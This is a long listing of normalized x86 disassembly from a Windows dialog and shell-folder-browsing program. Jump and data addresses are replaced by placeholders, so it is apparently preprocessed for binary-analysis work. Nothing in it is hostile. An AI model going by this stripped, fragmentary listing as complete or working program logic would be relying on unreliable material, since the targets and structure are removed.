sar ecx 0x2
xor ecx ecx
jmp r-xdata
je r-xdata
xor ecx ecx
lea esp [ esp ]
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
sub esp 0x70
mov eax esp
mov edx 0xf
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] esi
mov [ eax + 0x4 ] 0x0
mov [ esp + 0x8c ] esp
push ecx
mov [ eax + 0x6c ] edx
mov [ eax + 0x68 ] esi
mov ecx rw-data
mov [ eax + 0x58 ] 0x0
call sub_42cdb0
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
add eax 0x70
inc edi
mov [ esp + 0x1c ] eax
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
mov ebx [ esp + 0x1c ]
mov ecx esi
imul ecx ecx 0x70
add ecx eax
push ecx
lea ecx [ ebx + eax ]
call sub_402540
mov edx [ rw-data ]
mov [ ebx + edx + 0x38 ] edi
mov ebx [ rw-data ]
xor ecx ecx
mov eax [ rw-data ]
sub eax ebx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax esi
jbe r-xdata
mov ecx [ rw-data ]
cmp ecx esi
mov [ rw-data ] edx
je r-xdata
cmp edx esi
mov [ esp + 0x10 ] edi
jne r-xdata
mov eax [ rw-data ]
sub eax ebx
sar eax 0x2
xor eax eax
jmp r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
mov edi rw-data
lea ebp [ eax + esi ]
lea esp [ esp ]
cmp edx [ ebx + ecx * 4 ]
je r-xdata
cmp ecx eax
jge r-xdata
push esi
push edx
mov ecx rw-data
call sub_42c920
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi rw-data
lea ebp [ edx + ecx ]
lea ecx [ ecx ]
cmp esi [ ebx + ecx * 4 ]
je r-xdata
cmp ecx eax
jge r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
cmp esi ebp
je r-xdata
mov [ ebx + ecx * 4 ] 0xffffffff
mov edx [ rw-data ]
mov edi [ edx + ecx * 4 ]
test edi edi
lea esi [ edx + ecx * 4 ]
je r-xdata
inc ecx
jmp r-xdata
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov edi edx
mov edx ecx
sub edx edi
mov edi [ esi + 0x8 ]
cmp edi eax
ja r-xdata
cmp ecx ebp
je r-xdata
mov [ ebx + ecx * 4 ] edi
mov eax [ rw-data ]
mov ecx [ eax + ecx * 4 ]
mov [ ecx ] edi
call sub_439ed0
mov ebx [ rw-data ]
inc ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edx [ esp + 0x14 ]
cmp edx [ eax + ecx * 4 ]
je r-xdata
sub eax edx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
inc edx
cmp edx eax
mov [ esp + 0x14 ] edx
jl r-xdata
mov [ esi ] 0x0
mov ebx [ rw-data ]
dec [ edi + 0xd48 ]
jne r-xdata
test ebx ebx
jne r-xdata
mov edi [ esi + 0x4 ]
mov eax [ edi + eax * 4 ]
mov edi [ esp + 0x18 ]
cmp edi [ eax + edx * 4 ]
je r-xdata
sub eax edi
test ebx ebx
jne r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
mov ebp eax
sar ebp 0x2
mov eax ebp
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
inc esi
jmp r-xdata
mov edi [ esp + 0x10 ]
mov esi eax
cmp edi esi
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
mov edx [ eax + edi * 4 ]
mov edi [ esp + 0x10 ]
mov [ eax + edi * 4 ] edx
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
mov edi [ esp + 0x10 ]
inc ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
mov eax [ ecx + edx + 0x20 ]
sub [ rw-data ] eax
mov eax ebp
lea ecx [ eax * 4 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ edi + 0x8 ]
cmp edx eax
ja r-xdata
sub eax edx
cmp edi rw-data
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov [ eax + ecx * 4 ] edi
mov ebx [ rw-data ]
mov edi [ esp + 0x10 ]
sub eax edx
cmp esi rw-data
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
push eax
call [ LocalFree@IAT ]
mov eax ebp
lea ecx [ eax * 4 ]
sub esi ecx
mov ecx [ edi + 0x8 ]
cmp ecx eax
ja r-xdata
sub eax edx
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + esi * 4 ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] 0x0
mov ebx [ rw-data ]
sub eax ecx
sub_42d360
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfe68
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x50
cmp eax 0x111
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x1401
jne r-xdata
je r-xdata
xor eax eax
jmp r-xdata
call sub_42c380
mov esi [ esp + 0x70 ]
xor ebx ebx
push ebx
push ebx
push 0xe
push 0x410
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
movzx eax [ esp + 0x78 ]
dec eax
je r-xdata
cmp eax 0x10
je r-xdata
mov ecx [ esp + 0x60 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x10
sub eax ecx
push ebx
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov esi [ esp + 0x70 ]
xor ebx ebx
push ebx
push ebx
push 0x1401
push esi
call [ SendMessageA@IAT ]
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x68 ] ebx
call [ GetTickCount@IAT ]
mov edi [ rw-data ]
mov edx [ rw-data ]
xor ecx ecx
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
cmp edi ebx
sete cl
mov [ esp + 0x44 ] eax
lea eax [ esp + 0x20 ]
push eax
push sub_42caf0
push esi
push 0xc26
lea ecx [ ecx + ecx - 0x1 ]
mov [ esp + 0x5c ] ecx
mov ecx [ rw-data ]
push 0xfffffffa
push ecx
mov [ esp + 0x3c ] bl
mov [ esp + 0x60 ] edx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x48 ] bl
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp [ esp + 0x54 ] bl
jne r-xdata
dec eax
je r-xdata
mov esi [ esp + 0x70 ]
xor ebx ebx
push ebx
push ebx
push 0x1401
push esi
call [ SendMessageA@IAT ]
push 0x2
push esi
call [ EndDialog@IAT ]
jmp r-xdata
cmp eax 0x110
jne r-xdata
mov edx [ rw-data ]
inc edx
push edx
push eax
push 0x410
push esi
call [ GetDlgItemTextA@IAT ]
mov edi [ GetDlgItemInt@IAT ]
push ebx
push ebx
push 0x411
push esi
call edi
push ebx
push ebx
push 0x412
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x413
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x414
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x415
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x416
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x417
push esi
mov [ rw-data ] eax
call edi
push ebx
push ebx
push 0x418
push esi
mov [ esp + 0x20 ] ax
call edi
push ebx
push ebx
push 0x419
push esi
mov [ esp + 0x22 ] ax
call edi
push ebx
push ebx
push 0x41a
push esi
mov [ esp + 0x26 ] ax
call edi
push ebx
push ebx
push 0x41b
push esi
mov [ esp + 0x28 ] ax
call edi
push ebx
push ebx
push 0x41c
push esi
mov [ esp + 0x2a ] ax
call edi
mov [ esp + 0x1c ] ax
mov [ esp + 0x14 ] bx
cmp [ esp + 0x12 ] bx
mov [ esp + 0x1e ] bx
jne r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
lea ecx [ esp + 0x20 ]
call sub_42c5d0
jmp r-xdata
mov ecx [ esp + 0x38 ]
cmp ecx ebx
je r-xdata
sub eax 0x4eb
jne r-xdata
mov eax 0x1
mov eax [ rw-data ]
mov esi [ esp + 0x70 ]
xor ebx ebx
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ rw-data ] ebx
mov [ rw-data ] ebx
jne r-xdata
cmp [ esp + 0x16 ] bx
jne r-xdata
mov [ esp + 0x12 ] 0x1
mov edx [ rw-data ]
cmp edx [ rw-data ]
push ebx
push r--data
jne r-xdata
mov eax [ esp + 0x3c ]
sub eax ecx
sar eax 0x2
cmp eax ebx
jne r-xdata
mov esi [ esp + 0x70 ]
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x1401
push esi
call edi
push ebx
push esi
call [ ShowWindow@IAT ]
call sub_42cf20
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov edi [ GetDlgItem@IAT ]
push ebx
push 0x1
push esi
call edi
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push ebx
push 0x4ed
push esi
call edi
push eax
call ebp
cmp [ esp + 0x10 ] bx
mov ebp [ SystemTimeToFileTime@IAT ]
jne r-xdata
mov [ esp + 0x16 ] 0x1
push r--data
push esi
call [ MessageBoxA@IAT ]
mov eax [ rw-data ]
lea ecx [ esp + 0x20 ]
mov [ rw-data ] eax
call sub_42c5d0
jmp r-xdata
push r--data
jmp r-xdata
mov eax [ ecx ]
mov ecx [ rw-data ]
push 0x1
push ebx
push eax
push ecx
mov [ rw-data ] eax
call sub_485220
mov eax [ rw-data ]
mov ecx [ esp + 0x5c ]
add esp 0x10
add eax ecx
mov ecx [ rw-data ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
jl r-xdata
movzx edx [ rw-data ]
shl edx 0x10
or edx 0x1
push edx
push 0x1
push 0x406
push eax
call edi
push eax
push 0x410
push esi
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov edi [ SetDlgItemInt@IAT ]
je r-xdata
mov eax rw-data
push rw-data
lea eax [ esp + 0x14 ]
push eax
call ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
push esi
call [ MessageBoxA@IAT ]
cmp eax ecx
jl r-xdata
lea eax [ ecx - 0x1 ]
mov [ rw-data ] eax
push 0x1
push ebx
push eax
push esi
call sub_485220
add esp 0x10
push 0x1
push esi
call [ EndDialog@IAT ]
jmp r-xdata
lea eax [ ecx - 0x1 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
push 0x411
push esi
call edi
cmp [ esp + 0x16 ] bx
jne r-xdata
mov [ esp + 0x12 ] 0x1
push ebx
push ebx
push 0x41d
push esi
call edi
push ebx
push ebx
push 0x41e
push esi
mov [ esp + 0x20 ] ax
call edi
push ebx
push ebx
push 0x41f
push esi
mov [ esp + 0x22 ] ax
call edi
push ebx
push ebx
push 0x420
push esi
mov [ esp + 0x26 ] ax
call edi
push ebx
push ebx
push 0x421
push esi
mov [ esp + 0x28 ] ax
call edi
push ebx
push ebx
push 0x422
push esi
mov [ esp + 0x2a ] ax
call edi
cmp [ esp + 0x12 ] bx
mov [ esp + 0x1c ] ax
mov [ esp + 0x14 ] bx
mov [ esp + 0x1e ] bx
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
push 0x412
push esi
call edi
cmp [ esp + 0x10 ] bx
jne r-xdata
mov [ esp + 0x16 ] 0x1
push ebx
push r--data
push r--data
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
push 0x413
push esi
call edi
push rw-data
lea ecx [ esp + 0x14 ]
push ecx
call ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
push 0x414
push esi
call edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0x4f3
push esi
call edi
neg eax
sbb eax eax
push 0x4f4
neg eax
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
push 0x415
push esi
call edi
cmp [ rw-data ] ebx
mov ebp [ FileTimeToSystemTime@IAT ]
jne r-xdata
push ebx
push eax
push 0x416
push esi
call edi
lea eax [ esp + 0x10 ]
push eax
push rw-data
call ebp
movzx ecx [ esp + 0x10 ]
push ebx
push ecx
push 0x417
push esi
call edi
movzx edx [ esp + 0x12 ]
push ebx
push edx
push 0x418
push esi
call edi
movzx eax [ esp + 0x16 ]
push ebx
push eax
push 0x419
push esi
call edi
movzx ecx [ esp + 0x18 ]
push ebx
push ecx
push 0x41a
push esi
call edi
movzx edx [ esp + 0x1a ]
push ebx
push edx
push 0x41b
push esi
call edi
movzx eax [ esp + 0x1c ]
push ebx
push eax
push 0x41c
push esi
call edi
cmp [ rw-data ] ebx
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call ebp
movzx edx [ esp + 0x10 ]
push ebx
push edx
push 0x41d
push esi
call edi
movzx eax [ esp + 0x12 ]
push ebx
push eax
push 0x41e
push esi
call edi
movzx ecx [ esp + 0x16 ]
push ebx
push ecx
push 0x41f
push esi
call edi
movzx edx [ esp + 0x18 ]
push ebx
push edx
push 0x420
push esi
call edi
movzx eax [ esp + 0x1a ]
push ebx
push eax
push 0x421
push esi
call edi
movzx ecx [ esp + 0x1c ]
push ebx
push ecx
push 0x422
push esi
call edi
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push 0x1
jmp r-xdata
cmp [ rw-data ] ebx
mov edi [ CheckDlgButton@IAT ]
je r-xdata
push ebx
push 0x4f4
push esi
call edi
push 0x1
push 0x4f4
push esi
call edi
xor eax eax
jmp r-xdata
push 0x4f3
push esi
call edi
cmp [ rw-data ] ebx
je r-xdata
sub_42da50
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ eax + 0x14 ]
mov ecx [ esp + 0x8 ]
push esi
jge r-xdata
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x8
test ecx ecx
jbe r-xdata
mov esi [ eax + 0x10 ]
inc esi
mov edx esi
mov [ eax + 0x10 ] esi
mov esi [ eax + 0x14 ]
dec ecx
cmp edx esi
jl r-xdata
sub_42daa0
mov eax [ esp + 0x8 ]
push esi
push edi
mov ecx 0x4
mov edi r--data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov [ edx ] eax
mov ecx [ eax ]
push eax
xor esi esi
call [ ecx + 0x4 ]
pop edi
mov eax esi
pop esi
retn 0xc
mov esi eax
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
mov eax 0x80004002
mov [ ecx ] edx
pop esi
retn 0xc
sub_42db00
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push edi
push eax
call j_sub_4b66ed
mov edi [ esp + 0x10 ]
lea ecx [ edi + edi * 4 ]
shl ecx 0x2
push ecx
mov [ esi + 0x8 ] 0x0
call j_sub_4b573e#2
add esp 0x8
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov [ esi + 0xc ] edi
pop edi
mov eax 0x1
pop esi
retn 0x4
pop edi
pop esi
retn 0x4
sub_42db40
push esi
push edi
mov edi [ esp + 0xc ]
lea esi [ edi + 0x4 ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn 0x4
test edi edi
je r-xdata
mov ecx edi
call sub_42b890
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_42db70
mov ecx [ esp + 0x10 ]
test ecx ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov ebx ebp
je r-xdata
test ebp ebp
jbe r-xdata
mov [ ecx ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x10
mov edx [ esp + 0x1c ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
mov esi [ eax + 0x10 ]
cmp esi [ eax + 0x14 ]
jge r-xdata
test ecx ecx
jne r-xdata
test ebx ebx
jbe r-xdata
cmp ebp 0x1
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
lea ecx [ ecx + ecx * 4 ]
lea esi [ esi + ecx * 4 ]
mov edi edx
mov ecx 0x5
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
add edx 0x14
inc ecx
mov [ eax + 0x10 ] ecx
mov esi [ eax + 0x14 ]
dec ebx
cmp ecx esi
mov ecx [ esp + 0x20 ]
jl r-xdata
lea esp [ esp ]
pop edi
pop esi
xor eax eax
test ebx ebx
pop ebp
setne al
pop ebx
retn 0x10
sub ebp ebx
mov [ ecx ] ebp
sub_42dc10
push esi
mov esi [ esp + 0x8 ]
test esi esi
mov eax ecx
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx [ eax + 0xc ]
jl r-xdata
xor eax eax
pop esi
retn 0x4
mov edx [ eax + 0x8 ]
lea ecx [ ecx + ecx * 4 ]
push edi
lea edi [ edx + ecx * 4 ]
mov ecx 0x5
[ edi ] [ esi ]
mov ecx [ eax + 0x14 ]
inc ecx
pop edi
mov [ eax + 0x14 ] ecx
mov eax 0x1
pop esi
retn 0x4
mov eax 0x8007000e
pop esi
retn 0x4
sub_42dc60
mov eax [ esp + 0x8 ]
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
push edi
push 0x18
call sub_4b573e
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
mov eax 0x80004003
pop ebx
retn 0x8
pop edi
pop esi
mov eax 0x8007000e
pop ebx
retn 0x8
mov edi [ esp + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov eax [ edi + 0x14 ]
push eax
mov ecx esi
call sub_42db00
test eax eax
jne r-xdata
cmp [ edi + 0x14 ] ebx
jle r-xdata
mov [ esi ] r--data
mov ecx [ esi + 0x8 ]
push ecx
call j_sub_4b66ed
push esi
mov [ esi + 0x8 ] ebx
call j_sub_4b66ed#2
add esp 0x8
mov edx [ edi + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esi + 0x10 ] edx
pop edi
mov [ eax ] esi
pop esi
xor eax eax
pop ebx
retn 0x8
push ebp
xor ebp ebp
mov eax [ edi + 0x8 ]
add eax ebp
push eax
mov ecx esi
call sub_42dc10
mov eax [ edi + 0x14 ]
inc ebx
add ebp 0x14
cmp ebx eax
jl r-xdata
pop ebp
sub_42dd30
sub esp 0x10
push edi
push 0x0
call sub_42dd20
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor eax eax
pop edi
add esp 0x10
retn
lea eax [ esp + 0x4 ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jl r-xdata
lea ecx [ esp + 0x8 ]
push ecx
call [ SHGetDesktopFolder@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ esp + 0x1c ]
push ebp
push esi
xor ebp ebp
mov [ esp + 0x1c ] 0x1
xor esi esi
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov edx [ esp + 0x10 ]
push ebx
push edx
call sub_4442e0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x14 ]
mov [ esp + 0x1c ] 0x0
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push r--data
push 0x0
push esi
push eax
call [ ecx + 0x14 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
push 0xffff0000
push 0x0
push 0x1101
push ecx
call [ SendMessageA@IAT ]
mov edx [ esp + 0x10 ]
mov ecx [ edi + 0x4 ]
push 0x0
push edx
push 0xffff0000
push 0xffff0000
push ebp
push esi
push ebx
lea eax [ edi + 0x18 ]
push eax
push ecx
call sub_433290
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x48 ]
push 0x0
push edx
mov edx [ edi ]
push eax
lea ecx [ edi + 0x8 ]
push ecx
push edx
call sub_431590
mov al [ esp + 0x60 ]
add esp 0x38
test al al
jne r-xdata
mov eax [ rw-data ]
push eax
call [ LockWindowUpdate@IAT ]
test ebp ebp
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x0
call [ LockWindowUpdate@IAT ]
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x14 ]
push ebx
mov [ esp + 0x18 ] eax
call sub_444150
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov edx [ ebp ]
push ebp
call [ edx + 0x8 ]
test ebp ebp
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test esi esi
je r-xdata
jmp r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp ]
push ebp
call [ edx + 0x8 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call sub_444170
mov ebx eax
mov al [ esp + 0x30 ]
add esp 0x8
test al al
jne r-xdata
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x1c ]
pop esi
pop ebp
pop ebx
pop edi
add esp 0x10
retn
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push esi
push eax
call [ edx + 0x14 ]
sub_42dee0
sub esp 0x21c
lea eax [ esp + 0x4 ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
push esi
lea ecx [ esp + 0xc ]
push ecx
xor esi esi
call [ SHGetDesktopFolder@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x21c
retn
mov eax [ esp + 0x224 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
xor eax eax
pop esi
add esp 0x21c
retn
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
test eax eax
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov eax esi
pop esi
add esp 0x21c
retn
mov ecx [ esp + 0x228 ]
mov edx [ esp + 0x4 ]
push ecx
push edx
push 0x104
lea ecx [ esp + 0x1c ]
push ecx
push 0xffffffff
push eax
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0xc ]
mov edx [ eax ]
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x8 ]
push ecx
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x24 ]
push ecx
push 0x0
push 0x0
push eax
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x228 ]
mov eax [ esp + 0x4 ]
push edx
push eax
jmp r-xdata
call sub_42dd30
mov edx [ esp + 0xc ]
add esp 0x8
mov esi eax
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x14 ]
sub_42dfe0
push ecx
mov eax [ esp + 0x8 ]
push esi
push eax
call sub_42dd20
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop esi
pop ecx
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x4 ]
push ecx
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov [ esi + 0x1c ] 0xffff0000
mov edx [ esi + 0x4 ]
push 0xffff0000
push 0x0
push 0x1101
push edx
call [ SendMessageA@IAT ]
mov eax [ esi + 0x10 ]
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esi + 0xc ]
push 0xffff0000
push 0xffff0000
push edx
push eax
mov eax [ esi + 0x4 ]
push ecx
lea edx [ esi + 0x18 ]
push edx
push eax
call sub_433290
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
add esp 0x24
push eax
call [ ecx + 0x8 ]
mov eax 0x1
pop esi
pop ecx
retn
sub_42e070
push ecx
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jl r-xdata
xor eax eax
pop ecx
retn
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
push edx
call sub_42dd20
mov edx [ ecx + 0x4 ]
add esp 0x4
sub edx 0x64
je r-xdata
mov edx [ esp ]
push edx
add eax 0x8
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_431c50
add esp 0x14
dec edx
jne r-xdata
mov eax [ esp ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov edx [ esp ]
push edx
add eax 0x18
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_4345a0
mov eax [ esp + 0x14 ]
mov edx [ eax ]
add esp 0x14
push eax
call [ edx + 0x8 ]
xor eax eax
pop ecx
retn
sub_42e150
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
push esi
mov esi [ rw-data ]
sub ecx edx
mov [ rw-data ] 0x1
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
push 0x0
push ecx
call sub_42dd30
add esp 0x8
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
retn
sub eax edx
sub_42e1b0
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x11 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x10 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_42e210
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x11 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x10 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_42e270
mov eax [ ecx ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x11 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
